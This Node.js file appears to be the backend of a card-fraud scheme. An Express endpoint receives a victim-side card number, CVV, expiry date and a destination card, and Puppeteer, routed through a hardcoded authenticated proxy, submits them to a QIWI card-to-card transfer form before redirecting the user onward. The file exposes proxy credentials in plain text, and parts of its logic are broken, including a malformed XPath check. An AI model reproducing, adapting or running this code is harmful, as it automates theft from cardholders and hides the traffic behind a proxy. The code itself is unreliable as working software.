const puppeteer = require('puppeteer');
const express = require('express');
const bodyParser = require('body-parser')

const app = express()


app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())
const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
    const browser = await puppeteer.launch({args: ['--proxy-server=http://194.85.181.191:51933',' --no-sandbox', '--disable-setuid-sandbox']})
    const page = await browser.newPage()
    await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
    await page.setViewport({ width: 1920, height: 984 })
    await page.goto('https://qiwi.com/payment/form/31873')
    console.log(2)

    await setTimeout(() => {}, 5000)
    await page.waitForSelector('#app')
    await page.waitForSelector('.na-source-self-289')
    await page.click('.na-source-self-289')


    await page.waitForSelector('input.mask-text-input-form-field-input-control-self-238')

    const input_fields = await page.$$('input.mask-text-input-form-field-input-control-self-238')
    
    await input_fields[0].type(toCard)
    await input_fields[1].type(amount)
    await input_fields[2].type(fromCard)
    await input_fields[3].type(expireDate)

    await page.type('.hidden-text-input-form-field-input-control-self-319', cvv)

    if(email) await page.type('.text-input-form-field-input-control-self-336', email)

    await page.waitForTimeout(1500);
    
    await page.click('.submit-button-298')


    if(await page.waitForXPath('//*[contains(text(), "Ошибка платежа")]')) {
        await browser.close()
        return 0
    } else if (await page.waitForXPath('//*[contains(text), "Платеж проведен"]')) {
        await browser.close()
        return 1
    }
}
app.post('/sendData', async (req, res) => {
        const {returnURL, toCard,amount, fromCard, cvv, expireDate, email} = req.body
        console.log(1)
        return (await write_data(toCard,amount, fromCard, cvv, expireDate, email) === 1) ? res.redirect(returnURL) : res.status(400)
})

app.listen(5000)
